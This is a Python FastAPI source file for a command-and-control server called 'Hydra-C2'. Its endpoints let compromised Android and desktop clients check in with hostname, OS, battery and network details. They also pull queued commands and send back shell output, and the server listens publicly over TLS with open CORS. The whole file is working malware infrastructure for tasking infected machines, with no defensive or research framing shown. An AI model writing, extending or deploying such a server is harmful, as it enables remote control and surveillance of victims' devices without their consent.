from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
from db import init_db, register_client, get_pending_task, complete_task
import uvicorn
import json

def print_banner():
    banner = r"""
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
            __/ |                              
           |___/                               

    >> Project Hydra-C2: Multi-headed Framework
    >> Status: Online | SSL: Enabled
    """
    print(banner)

@asynccontextmanager
async def lifespan(app: FastAPI):
    print_banner()
    await init_db()
    yield

app = FastAPI(lifespan=lifespan, redirect_slashes=False)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
async def checkin(client_id: str, platform: str, request: Request):
    client_ip = request.client.host
    
    # Capture telemetry if sent via POST
    if request.method == "POST":
        try:
            telemetry = await request.json()
            hostname = telemetry.get('hostname', 'Unknown')
            os_version = telemetry.get('os_version', 'Unknown')
            
            # Platform-specific logging logic
            if platform == "android":
                net = telemetry.get('network', 'N/A')
                batt = telemetry.get('battery', 'N/A')
                print(f"[*] [MOBILE] {client_id}: {hostname} | {os_version} | Net: {net} | Batt: {batt}")
            else:
                ram = telemetry.get('total_memory', 'Unknown')
                print(f"[*] [DESKTOP] {client_id}: {hostname} | {os_version} | {ram}MB RAM")
                
        except Exception as e:
            print(f"[-] Telemetry parsing error: {e}")

    # 1. Register/Update the head in the DB
    await register_client(client_id, platform, client_ip)
    
    # 2. Check for specific tasks for this ID
    task = await get_pending_task(client_id)
    command_payload = None

    if task:
        command_payload = {
            "action": task["action"],
            "data": json.loads(task["payload"])
        }
        await complete_task(task["task_id"])
        print(f"[!] Task DISPATCHED to {client_id}: {task['action']}")

    return {
        "status": "success",
        "response": "acknowledged",
        "command": command_payload
    }

@app.post("/report/{client_id}")
async def report_output(client_id: str, request: Request):
    data = await request.json()
    output = data.get("output", "No output")
    
    print(f"\n[+] SHELL_OUTPUT FROM {client_id}:")
    print("-" * 40)
    print(output.strip())
    print("-" * 40 + "\n")
    
    return {"status": "received"}

if __name__ == "__main__":
    uvicorn.run(
        "main:app",
        host="0.0.0.0", 
        port=8443, 
        ssl_keyfile="key.pem", 
        ssl_certfile="cert.pem",
        reload=True
    )